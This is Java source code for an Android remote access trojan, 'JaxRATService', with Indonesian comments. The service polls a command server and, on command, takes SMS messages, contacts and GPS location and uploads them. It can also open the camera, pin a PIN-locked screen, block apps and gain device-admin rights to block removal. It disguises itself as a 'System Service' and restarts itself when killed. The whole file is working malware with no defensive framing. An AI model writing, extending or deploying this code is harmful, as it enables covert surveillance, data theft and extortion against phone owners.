package com.ezax.agent;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.SystemClock;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class JaxRATService extends Service {
    private static final String SERVER_URL = "http://192.168.1.26:5000"; // SESUAIKAN IP
    private static final String DEVICE_ID = "hp_target_1"; 
    private static final String CHANNEL_ID = "JaxRAT_Channel";
    
    private Handler handler = new Handler(Looper.getMainLooper());
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isStrobe = false;
    private Handler strobeHandler = new Handler();
    private boolean isTorchOn = false;

    @Override
    public void onCreate() {
        super.onCreate();
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
                Boolean flashAvailable = characteristics.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (flashAvailable != null && flashAvailable && facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id; break;
                }
            }
        } catch (CameraAccessException e) { }

        createNotificationChannel();
        startForeground(1, getNotification());
        startPolling();
    }

    private void startPolling() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                fetchCommand();
                handler.postDelayed(this, 3000);
            }
        }, 3000);
    }

    private void fetchCommand() {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL + "/api/get_command/" + DEVICE_ID);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = in.readLine()) != null) response.append(line);
                in.close();

                JSONObject json = new JSONObject(response.toString());
                String cmd = json.optString("command", "none");
                if (!cmd.equals("none")) {
                    showToast("Cmd: " + cmd);
                    executeCommand(cmd);
                }
            } catch (Exception e) { }
        }).start();
    }

    private void showToast(String msg) {
        handler.post(() -> Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_SHORT).show());
    }

    private void executeCommand(String cmd) {
        if (cmd.equals("flash_on")) { stopStrobe(); setTorch(true); } 
        else if (cmd.equals("flash_off")) { stopStrobe(); setTorch(false); } 
        else if (cmd.equals("flash_strobe")) { startStrobe(); } 
        else if (cmd.equals("STOP_ALL")) { stopStrobe(); setTorch(false); } 
        else if (cmd.startsWith("pin|")) {
            String[] parts = cmd.split("\\|");
            if (parts.length >= 7) {
                Intent intent = new Intent(this, LockScreenActivity.class);
                intent.putExtra("TIMER", Long.parseLong(parts[1].trim()));
                intent.putExtra("SUARA", parts[2].trim());
                intent.putExtra("GETAR", parts[3].trim());
                intent.putExtra("VOLUME", parts[4].trim());
                intent.putExtra("PESAN", parts[5].trim());
                intent.putExtra("PIN", parts[6].trim());
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        } else if (cmd.equals("unpin_screen")) {
            Intent intent = new Intent(this, LockScreenActivity.class);
            intent.putExtra("ACTION", "FINISH");
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Intent broadcastIntent = new Intent("UNLOCK_SCREEN_ACTION");
            broadcastIntent.setPackage(getPackageName());
            sendBroadcast(broadcastIntent);
        } else if (cmd.equals("get_gps")) {
            ambilGps();
        } else if (cmd.equals("get_sms")) {
            ambilSms();
        } else if (cmd.equals("get_contacts")) {
            ambilKontak();
        } else if (cmd.equals("camera_front") || cmd.equals("camera_back")) {
            Intent camIntent = new Intent(this, CameraActivity.class);
            camIntent.putExtra("FRONT", cmd.equals("camera_front"));
            camIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(camIntent);
        } else if (cmd.equals("anti_uninstall_on")) {
            aktifkanAdmin();
        } else if (cmd.equals("anti_uninstall_off")) {
            matikanAdmin();
        } else if (cmd.startsWith("block_apps|")) {
            // FORMAT BARU: block_apps|timer|package1,package2
            String[] parts = cmd.split("\\|");
            if (parts.length >= 2) {
                int timer = 0;
                String apps = "";
                if (parts.length == 3) {
                    timer = Integer.parseInt(parts[1].trim());
                    apps = parts[2].trim();
                } else {
                    apps = parts[1].trim(); // Fallback buat format lama
                }

                SharedPreferences prefs = getSharedPreferences("JaxPrefs", MODE_PRIVATE);
                prefs.edit().putString("blocked_apps", apps).putInt("block_timer", timer).apply();
                
                // Kasih tau Accessibility kalau ada perubahan
                Intent intent = new Intent("UPDATE_BLOCK_LIST");
                intent.setPackage(getPackageName());
                sendBroadcast(intent);

                if (apps.isEmpty()) {
                    showToast("Semua blokir dilepas!");
                } else {
                    showToast("Aplikasi diblokir selama " + (timer == 0 ? "Permanen" : timer + " menit"));
                }
            }
        }
    }

    private void aktifkanAdmin() {
        ComponentName adminComponent = new ComponentName(this, JaxAdminReceiver.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan perlindungan JaxRAT.");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } else { showToast("Admin sudah aktif!"); }
    }

    private void matikanAdmin() {
        ComponentName adminComponent = new ComponentName(this, JaxAdminReceiver.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm.isAdminActive(adminComponent)) {
            dpm.removeActiveAdmin(adminComponent);
            showToast("Admin dimatikan.");
        }
    }

    private void ambilKontak() {
        try {
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
            JSONArray contactsArray = new JSONArray();
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int phoneIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                do {
                    if (count >= 50) break; 
                    JSONObject contact = new JSONObject();
                    contact.put("name", cursor.getString(nameIdx) != null ? cursor.getString(nameIdx) : "Tanpa Nama");
                    contact.put("phone", cursor.getString(phoneIdx));
                    contactsArray.put(contact);
                    count++;
                } while (cursor.moveToNext());
                cursor.close();
            }
            kirimHasilKeWeb("contacts", contactsArray);
        } catch (Exception e) { }
    }

    private void ambilGps() {
        try {
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            String koordinat = loc != null ? loc.getLatitude() + ", " + loc.getLongitude() : "Lokasi tidak ditemukan";
            kirimHasilKeWeb("gps", koordinat);
        } catch (Exception e) { }
    }

    private void ambilSms() {
        try {
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return;
            JSONArray smsArray = new JSONArray();
            Uri uriSms = Uri.parse("content://sms/inbox");
            Cursor cursor = getContentResolver().query(uriSms, null, null, null, "date DESC LIMIT 10");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    smsArray.put(sms);
                } while (cursor.moveToNext());
                cursor.close();
            }
            kirimHasilKeWeb("sms", smsArray);
        } catch (Exception e) { }
    }

    private void kirimHasilKeWeb(String type, Object data) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL + "/api/upload_result/" + DEVICE_ID);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                JSONObject json = new JSONObject();
                json.put("type", type);
                json.put("data", data);
                try (OutputStream os = conn.getOutputStream()) { os.write(json.toString().getBytes("utf-8")); }
                conn.getResponseCode();
            } catch (Exception e) { }
        }).start();
    }

    private void setTorch(boolean state) {
        try { if (cameraId != null) cameraManager.setTorchMode(cameraId, state); } catch (Exception e) { }
    }
    private void startStrobe() { isStrobe = true; strobeHandler.post(strobeRunnable); }
    private void stopStrobe() { isStrobe = false; strobeHandler.removeCallbacks(strobeRunnable); setTorch(false); }
    private final Runnable strobeRunnable = new Runnable() {
        @Override public void run() {
            if (isStrobe) { setTorch(!isTorchOn); isTorchOn = !isTorchOn; strobeHandler.postDelayed(this, 400); }
        }
    };

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(CHANNEL_ID, "JaxRAT Service", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(serviceChannel);
        }
    }
    private Notification getNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("System Service").setContentText("Menjalankan layanan...").setSmallIcon(android.R.drawable.ic_menu_compass).setOngoing(true).build();
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public void onTaskRemoved(Intent rootIntent) {
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        PendingIntent restartServicePendingIntent = PendingIntent.getService(getApplicationContext(), 1, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        if (alarmService != null) alarmService.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent);
        super.onTaskRemoved(rootIntent);
    }
    @Override public IBinder onBind(Intent intent) { return null; }
}
